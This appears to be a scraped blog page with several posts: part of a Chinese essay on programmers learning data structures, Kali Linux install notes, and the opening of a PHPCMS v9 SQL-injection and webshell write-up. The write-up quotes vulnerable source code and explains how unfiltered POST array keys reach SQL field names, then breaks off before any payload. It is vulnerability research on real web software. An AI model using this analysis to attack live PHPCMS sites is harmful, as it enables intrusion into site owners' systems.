</em>   答: 当他听说赛灵思的在 ZYNQ 的 QEMU 模型上跑的开源 Linux 内核推出了，并且发布在 wiki.xilinx.com 上，立即就开始下载研究，跑起来， 即没有要项目经费，也没有要资助和捐赠，<strong>因为在开源人的眼里??无论是开源软件还是开源硬件，开源就象信仰一样，无需证明</strong>。<br><br>　　看完这个故事有什么感想吗？<br><br>　　不是每一个程序员都要成为比尔?盖茨，都要建立商业帝国成为世界首富。也不是每一个程序员都要做马化腾，建立QQ帝国君临天下。但是我觉得，每个程序员都应该向Dennis Ritchie（C语言之父）学习，在贝尔实验室默默为计算机界奋斗一生。每个程序员都应该向Linus Torvalds学习，写出改变计算机世界的Linux但却不争名夺利。比尔?盖茨、马化腾是IT商业化的代表，而Dennis Ritchie和Linus Torvalds则是计算机界学者的先驱。<br><br>　　台湾作家龙应台说了这么一句话：你可以选择做官，你也可以选择挣钱，但你不能选择通过做官来挣钱。<br><br>　　同样的，对程序员而言，你可以选择研究技术，也可以选择赚钱。但是以赚钱的心态去做程序员，那么你也许会品尝不到技术的很多快乐。程序员是一个职业，一个专业的职业，那么作为一个程序员应该有一个专业上的目标，赚多少钱和程序员的专业素养没有关系，你可以把赚多少钱开宝马作为人生的目标，但是你作为程序员的目标不应该是赚钱。可以这么说，现在行业内的程序员很多都不是真正的程序员，对那些做着程序员工作的代码工人来说，程序员只是一个混口饭吃的工作而已，那么工作的目的就是赚钱，盯着钱看就没什么不对了。人生目标和自己的专业目标分不清楚，难怪哪头都讨不到好。专业和职业是两码事，专业关注的是你做事的能力，职业关系的是你在公司的职位，这个东西理不清楚就只能是两头不讨好。真正的程序员应该是个热爱技术的Geek，喜欢创造与挑战，享受技术带来的喜悦与创造带来的成就感，而非不断编写着一遍又一遍重复code的码农。<br><br>　　作为程序员应该追求的是自己专业素养上的提升，作为一个职员应该向着高薪努力，当然有的程序员自己又是老板，比如康盛创想的戴志康 ，那么作为老板又有另外的追求了。我觉得作为一个程序员，在一个程序员的社区里应该关注的是自己的专业而不是在这里大谈程序员怎么怎么赚不到钱。<br><br>　　也许，每一个程序员在开始的时候都想过要写出非常牛逼的程序，做个人人崇拜的高手，直到有一天，他发现他的代码并不能改变世界的时候，就会向现实屈服，甚至抛弃往昔自己喜欢的编程。<br><br>　　与程序打交道，是我们选择的工作，也是我们选择的职业。程序员，应该是一个值得骄傲的称号，而非是码农的代名词。走出浮躁的泥沼，我们会找到另外一个不同的自己。<br><br>　　<strong>学会享受学习过程的乐趣</strong><br><br>　　学习是一辈子的事情，对于程序员来说更是如此，所以如果没有学会享受学习过程的乐趣，那么学习将会是你人生的一个重压。<br><br>　　以学习数据结构为例。大家都知道，对于程序员而言，数据结构是基础，是必须学会的课程。但是现在很多语言，细节都封装得很好，比如Java、.Net、PHP，几乎都不需要你用到多少数据结构与算法的知识，以致于很多人觉得，我就不会数据结构，我还不一样好好工作吗？这就是浮躁的开始了。<br><br>　　的确，对大部分程序员来说，工作上很多时候不需要用到数据结构。但是你会发现，工作若干年后，你的技术水平会停滞不前，做的东西总是CURD，再加上一点设计模式，再者可能有NoSQL、memcache之类的应用。但是，当你写这些代码写到疲软的时候，你会发现这些都是应用层面的东西，别人做好的现成的东西，到你想理解它们底层与原理的时候，没有数据结构与算法的知识支撑，你会很吃力。勿在浮沙筑高台，尽管你开源软件用得多好，如果不去理解计算机的底层，顶多也就是个高级点的码农。<br><br>　　要走出浮躁的泥沼，只要理解一句话就行：<br><br>&gt; 学习的真正乐趣不是因为它有用，而是因为学习的过程本身有趣。<br><br>　　所以你需要去发现学习过程有哪些乐趣，还是拿数据结构的学习为例。<br><br>　　1. 数据结构的学习在短期内不会对工作有什么效果，但它是对未来以及自己的投资。学习它你一定不要浮躁，不要觉得它短期内收益不大就不去学习。摒弃浮躁的第一步就是，不要带着功利的眼光去学习。<br><br>　　2. 数据结构的学习几乎都是从线性表开始，然后讲到最重要的单链表。单链表的基本操作就建表、插入、删除、查找等，如果你把这些操作都学完了，是不是该立即进入堆栈的学习呢？我的建议是，不。“学习”是一个实际上不应该分割的词汇，只有“学”没有“习”将必然导致肤浅。当学完单链表的基本操作，你需要做更多的“习”。这时候你需要尝试着研究下面的问题：单链表的逆序、求单链表的倒数第N个元素、单链表的排序、单链表的环……等等。当你对单链表的学习进入某种境界，才进入堆栈的学习，这样你的单链表就很扎实，同时学习堆栈也会变得很有效率。你可以参考我之前所做的专题：《<a href="http://www.nowamagic.net/librarys/veda/special/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%89%A9%E8%AF%AD%E5%8D%B7%E4%BA%8C/" target="_blank" rel="noopener">数据结构物语卷二</a>》<br><br>　　千万不要觉得这很浪费时间。左学点右学点，散沙式的学习才浪费时间，连续的思考才是高效的。<br><br>　　3. 享受思考的乐趣。数据结构一开始学也许你会觉得有点难，比如插入一个数据都要涉及几个结点的地址操作，但是当你思考并完全理解为什么这么做，你会有一种豁然开朗的感觉。并且更重要的是，每解决一个单链表的问题，就相当于做了一次思维训练。思维训练做得多了，对单链表的理解就更深了，以后解决问题就更快。我们可以这么认为，每做一次思维训练，都能够使我们的思维加速，使我们的大脑加速。为什么牛人一看问题就能知道如何解决？很简单，因为他做过普通人无法想象的大量的思维训练，正如巴菲特7岁就开始拜师学投资一样。没有人天生就是大牛，对吧？<br><br>　　4. 关于学习的欲望。很多人心里知道，我要学习，但是总是容易被分心。一会看看微博，一会折腾下其它什么东西，结果半天还没看得进一点东西。不要假学习，不要为不学习找理由，没钱？没时间？累？只要你内心坚定且欲望强烈，就会主动学习。<br><br>　　可以看看这篇文章：<a href="http://www.nowamagic.net/librarys/eight/posts/2230" target="_blank" rel="noopener">另外八小时，用辛勤换幸福</a>。如果能把写博当作是一种放松，如果能把写博当作一种享受，不带任何功利的杂质，那么你就会非常强烈地想去写博。（对我来说，写博就是学习）<br><br>　　你可以尝试下早上6点半起来，学习一个小时再去上班，效果很好。这篇文章就是我早上6点多开始写的。学习大部分时间是一个人的活动，难免会有孤独感，当你精力高度集中时，孤独感会减少。当你全神贯注的时候，甚至会感到身心愉悦。“耐得寂寞不寂寞，耐不住寂寞反寂寞。”<br><br>　　5. 不要被厚厚的书吓住。有的人也许会说，你看，数据结构那么多章节，你光单链表这一章就做了一百多个练习，花了一两个月，什么时候才能看得完啊？我说，学习没人逼你进度，随意看，什么时候觉得自己精通了再转入下一个学习阶段。过早地进入下一个阶段只会让你过早地忘记前面的知识，比如草草地看了单链表的基本操作，就去学堆栈，过一个星期我问你单链表的反转，你也许就会一时想不出。所以我认为：<br><br>&gt; 坚持做一件事，直到达到一个境界??至于是什么境界，我不知道，你才知道??然后才开始做另外一件事。<br><br>　　6. 你对学习有如饥似渴的感觉吗？对待学习，我很推崇完美主义。比如单链表的基本操作弄懂了，写程序过了一遍，然后开始研究它的各种常见操作。都研究完了，开始研究比较少见的操作，带头结点与不带头结点的都要过一遍。然后翻遍互联网，看看有没自己疏漏的。发现有疏漏的，你会很高兴，马上再写程序自己过一遍。直到Google搜索“单链表”前100页的结果你都能马上知道什么回事，知道怎么做，嗯，那就差不多了。<br><br>　　很疯狂吗？在常人看来也许是。但是对我们自己来说，不这么做，很难达到某种境界，或者说，精通。对知识的如饥似渴的时候，当得到新的发现新的知识，你会得到很大的满足感，而且一路走来的成就感，也是对你之前努力的最大回报。<br><br>　　那么，从现在开始，逃离浮躁的泥沼，享受学习过程的乐趣。<br><br></div><br></div>
          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2013/03/30/《桃源》杂志-第六期-下载/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2013/03/30/《桃源》杂志-第六期-下载/" itemprop="url">《桃源》杂志 第六期 下载</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Veröffentlicht am</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2013-03-30T16:40:49+08:00">
                2013-03-30
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">in</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/技术文章/" itemprop="url" rel="index">
                    <span itemprop="name">技术文章</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p><a href="http://lanu-upload.stor.sinaapp.com/201303/2ace7e0ddc324f941d9408346ec0013220130330163103248181719.jpg" target="_blank" rel="noopener"><img src="http://lanu-upload.stor.sinaapp.com/201303/2ace7e0ddc324f941d9408346ec0013220130330163103248181719.jpg" alt="点击查看原图"></a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2013/03/17/kali-linux-安装遇到的一些问题/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2013/03/17/kali-linux-安装遇到的一些问题/" itemprop="url">kali linux 安装遇到的一些问题</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Veröffentlicht am</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2013-03-17T14:07:16+08:00">
                2013-03-17
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">in</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Android-Java-Linux/" itemprop="url" rel="index">
                    <span itemprop="name">Android|Java|Linux</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>&nbsp;&nbsp;&nbsp;&nbsp; 据说kali linux 是bt的儿子，于是下载了一个vm版的体验了一下，感觉不错，于是装在了笔记本上，体验了下真不错，于是想装在台式机上直接作为主系统，</p>
<p>&nbsp;&nbsp;&nbsp; 安装的过程中遇到了两个问题，第一个是系统缺失一些文件，直接google下载相应的deb</p>
<p>&nbsp;&nbsp;&nbsp; 第二个是显卡驱动问题，它自带的nouveau取得错误</p>
<p>&nbsp;&nbsp;&nbsp; 我现进入恢复模式关闭mouveau</p>
<p>&nbsp;&nbsp;&nbsp; 具体步骤：</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;root@bt~# echo options nouveau modeset=0 | sudo tee -a<br>/etc/modprobe.d/nouveau-kms.conf &nbsp; &nbsp;&nbsp; </p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;<br>//&amp;#42在modprobe.d下建立nouveau-kms.conf文件,并写入<span style="line-height:22px;">options nouveau modeset=0这句&amp;#42//</span></p>
<p><span style="line-height:22px;">&nbsp;&nbsp;&nbsp;&nbsp;</span></p>
<p></p>
<p><span style="line-height:22px;">&nbsp;&nbsp;&nbsp;&nbsp;root@bt~# update-initramfs -u</span></p>
<p>&nbsp;&nbsp;&nbsp; <span style="line-height:22px;">在执行update-initramfs -u的时候报错缺失一些网卡驱动文件，于是同上百度下载deb安装</span></p>
<p><span style="line-height:22px;">&nbsp;&nbsp;&nbsp; 但是安装的时候又出错了，说是不能覆盖源程序，所以我直接解压deb提取相关文件复制到相关目录</span></p>
<p><span style="line-height:22px;">&nbsp;&nbsp;&nbsp; 然后再执行</span></p>
<p><span style="line-height:22px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;update-initramfs -u</span></p>
<p><span style="line-height:22px;">&nbsp;&nbsp;&nbsp; 成功</span></p>
<p></p>
<p><span style="line-height:22px;">&nbsp;&nbsp;&nbsp; 然后reboot重启</span></p>
<p><span style="line-height:22px;">&nbsp;&nbsp;&nbsp; 重启后进入正常模式更新相关内核</span></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;apt-get install linux-headers-$(uname -r)</p>
<p>&nbsp;&nbsp;&nbsp; 然后直接安装官网的驱动</p>
<p>&nbsp;&nbsp;&nbsp; 启动起来过后直接ok</p>
<p>&nbsp;&nbsp;&nbsp; kali有自带的中文语言包不用自己汉化了</p>
<p>&nbsp;&nbsp;&nbsp; 更新163的软件源，他自带的debian的源没法访问</p>
<p>&nbsp;&nbsp;&nbsp; 然后装输入发scim</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2013/03/05/PHPCMS-v9-的那些注入和getwebshell/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2013/03/05/PHPCMS-v9-的那些注入和getwebshell/" itemprop="url">PHPCMS v9 的那些注入和getwebshell</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Veröffentlicht am</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2013-03-05T10:17:21+08:00">
                2013-03-05
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">in</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/0day漏洞/" itemprop="url" rel="index">
                    <span itemprop="name">0day漏洞</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <div class="Section0"><br><br><span style="mso-spacerun:’yes’;font-size:15.0000pt;font-family:’宋体’;">PHPCMS&nbsp;v9&nbsp;<span style="font-family:宋体;">注入和</span><span style="font-family:’Times New Roman’;">getwebshell</span></span><span style="mso-spacerun:’yes’;font-size:15.0000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:15.0000pt;font-family:’宋体’;"><span style="font-family:’Times New Roman’;"><br><br></span></span><br><br><span style="mso-spacerun:’yes’;font-size:15.0000pt;font-family:’宋体’;"><span style="font-family:’Times New Roman’;"><br><br></span></span><br><br><span style="mso-spacerun:’yes’;font-size:15.0000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">0x00&nbsp;<span style="font-family:宋体;">前言</span></span><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">0x01&nbsp;<span style="font-family:宋体;">新年左右的注入</span></span><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">0x02&nbsp;<span style="font-family:宋体;">绕过厂商的补丁</span></span><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">0x03&nbsp;<span style="font-family:宋体;">破不开的密码</span></span><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">0x04&nbsp;<span style="font-family:宋体;">曾经的</span><span style="font-family:’Times New Roman’;">getwebshell</span></span><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">0x05&nbsp;<span style="font-family:宋体;">补漏了</span><span style="font-family:’Times New Roman’;">apache</span></span><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">0x06&nbsp;Exploit<span style="font-family:宋体;">编写</span></span><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">0x07&nbsp;<span style="font-family:宋体;">结束语</span></span><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">0x00&nbsp;<span style="font-family:宋体;">前言</span></span><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;"><span style="font-family:宋体;"><br><br></span></span><br><br><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;"><span style="font-family:宋体;"><br><br></span></span><br><br><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">PHPCMS&nbsp;V9<span style="font-family:宋体;">（后面简称</span><span style="font-family:’Times New Roman’;">V9</span><span style="font-family:宋体;">）采用</span><span style="font-family:’Times New Roman’;">PHP5+MYSQL</span><span style="font-family:宋体;">做为技术基础进行开发。</span><span style="font-family:’Times New Roman’;">V9</span><span style="font-family:宋体;">采用</span><span style="font-family:’Times New Roman’;">OOP</span><span style="font-family:宋体;">（面向对象）方式进行基础运行框架搭建。模块化开发方式做为功能开发形式。框架易于功能扩展，代码维护，优秀的二次开发能力，可满足所有网站的应用需求。&nbsp;</span><span style="font-family:’Times New Roman’;">5</span><span style="font-family:宋体;">年开发经验的优秀团队，在掌握了丰富的</span><span style="font-family:’Times New Roman’;">WEB</span><span style="font-family:宋体;">开发经验和</span><span style="font-family:’Times New Roman’;">CMS</span><span style="font-family:宋体;">产品开发经验的同时，勇于创新追求完美的设计理念，为全球多达</span><span style="font-family:’Times New Roman’;">10</span><span style="font-family:宋体;">万网站提供助力，并被更多的政府机构、教育机构、事业单位、商业企业、个人站长所认可。&nbsp;</span></span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">V9<span style="font-family:宋体;">在保留</span><span style="font-family:’Times New Roman’;">2008</span><span style="font-family:宋体;">版的特点的同时，对新版本作出重大的创新，以期待全新的</span><span style="font-family:’Times New Roman’;">PHPCMS</span><span style="font-family:宋体;">系统服务更多的用户。</span></span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">（以上复制的官网简介）</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">新年到来的时候</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">wooyun<span style="font-family:宋体;">和</span><span style="font-family:’Times New Roman’;">t00ls</span><span style="font-family:宋体;">上都有把</span><span style="font-family:’Times New Roman’;">phpcms&nbsp;v9</span><span style="font-family:宋体;">的漏洞作为新年礼物发布出来和大家分享，我也去下载了最新的</span><span style="font-family:’Times New Roman’;">phpcms&nbsp;v9</span><span style="font-family:宋体;">的程序分析了下代码，在此把一些菜鸟的心得说给大家听下，望大家指正。</span></span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">0x01&nbsp;<span style="font-family:宋体;">新年左右的注入</span></span><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">1.</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">短消息回复注入</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><pre class="brush:php; toolbar: true; auto-links: true;">/phpcms/modules/message/index.php<br>public function reply() {<br>if(isset($_POST[’dosubmit’])) {<br>$messageid = intval($_POST[’info’][’replyid’]);<br>//判断当前会员，是否可发，短消息．<br>$this-&gt;message_db-&gt;messagecheck($this-&gt;_userid);<br> //检查此消息是否有权限回复<br>$this-&gt;check_user($messageid,’to’);<br>$_POST[’info’][’send_from_id’] = $this-&gt;_username;<br>$_POST[’info’][’message_time’] = SYS_TIME;<br>$_POST[’info’][’status’] = ’1’;<br>$_POST[’info’][’folder’] = ’inbox’;<br>$_POST[’info’][’content’] = safe_replace($_POST[’info’][’content’]);<br>$_POST[’info’][’subject’] = safe_replace($_POST[’info’][’subject’]);<br>if(empty($_POST[’info’][’send_to_id’])) {<br>howmessage(L(’user_noempty’),HTTP_REFERER);<br>}<br>$messageid = $this-&gt;message_db-&gt;insert($_POST[’info’],true);//这儿数据传入                        if(!$messageid) return FALSE;<br>showmessage(L(’operation_success’),HTTP_REFERER);<br>} else {<br>$show_validator = $show_scroll = $show_header = true;<br>include template(’message’, ’send’);<br>}<br>}</pre><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">上边把<span style="font-family:’Times New Roman’;">POST</span><span style="font-family:宋体;">数据直接传入了</span><span style="font-family:’Times New Roman’;">insert</span><span style="font-family:宋体;">函数</span></span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">Mysql.class.php<span style="font-family:宋体;">中</span><span style="font-family:’Times New Roman’;">:</span></span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><pre class="brush:php; toolbar: true; auto-links: true;">public function insert($data, $table, $return_insert_id = false, $replace = false) {<br>if(!is_array( $data ) || $table == ’’ || count($data) == 0) {<br>        return false;<br>     }<br>    $fielddata = array_keys($data);//这儿直接以数组下标作为字段<br>    $valuedata = array_values($data);<br>    array_walk($fielddata, array($this, ’add_special_char’));<br>//到了关键地方，关键的过滤函数add_special_char<br>array_walk($valuedata, array($this, ’escape_string’));<br>    $field = implode (’,’, $fielddata);<br>    $value = implode (’,’, $valuedata);<br>    $cmd = $replace ? ’REPLACE INTO’ : ’INSERT INTO’;<br>    $sql = $cmd.’ <code>’.$this-&amp;gt;config[’database’].’</code>.<code>’.$table.’</code>(’.$field.’) VALUES (’.$value.’)’;<br>    $return = $this-&gt;execute($sql);<br>return $return_insert_id ? $this-&gt;insert_id() : $return;<br>}</pre><br><br><span style="font-size:10.5pt;font-family:宋体;">漏洞函数出现了：</span><span style="font-size:10.5pt;font-family:宋体;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><pre class="brush:php; toolbar: true; auto-links: true;">public function add_special_char(&amp;$value) {<br>if(’&amp;#42’ == $value || false !== strpos($value, ’(’) || false !== strpos($value, ’.’) || false !== strpos ( $value, ’<code>’)) {
//不处理包含&amp;#42 或者 使用了sql方法。
} else {
